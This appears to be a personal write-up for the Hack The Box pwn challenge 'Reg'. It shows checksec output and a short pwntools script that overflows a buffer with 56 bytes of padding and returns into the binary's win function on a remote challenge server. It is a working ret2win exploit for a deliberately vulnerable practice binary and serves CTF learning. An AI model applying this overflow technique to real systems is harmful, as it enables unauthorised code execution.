---
title: "Reg (Ret2Win) (Pwn)"
category: "pwn"
subcategory: "htb-challenges"
type: "writeup"
tags: ["my-notes", "personal", "ret2win", "canary", "pie", "lsb", "checksec", "pwn", "htb-challenges"]
summary: "Personal note: Reg (Ret2Win) (Pwn)."
source:
  name: "Personal notes"
origin_path: "HTB Challenges/Pwn/Reg (Ret2Win).md"
---

```bash
└─$ file reg        
reg: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=134349a67c90466b7ce51c67c21834272e92bdbf, for GNU/Linux 3.2.0, not stripped
```

```bash
└─$ checksec reg            
[*] '/home/ahmed/Desktop/HTB/Challenges/Pwn/Reg/reg'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

---

# Exploit

```bash
win address : 0x0000000000401206
offset : 56
```

```python
from pwn import *

\#p = process("./reg")
p = remote("167.99.90.155",31057)

offset = 56
win = 0x0000000000401206
payload = b''
payload += b'A' * offset
payload += p64(win)

p.sendlineafter(b'name : ', payload)
p.interactive()
```

---

*From your own notes: `HTB Challenges/Pwn/Reg (Ret2Win).md`*
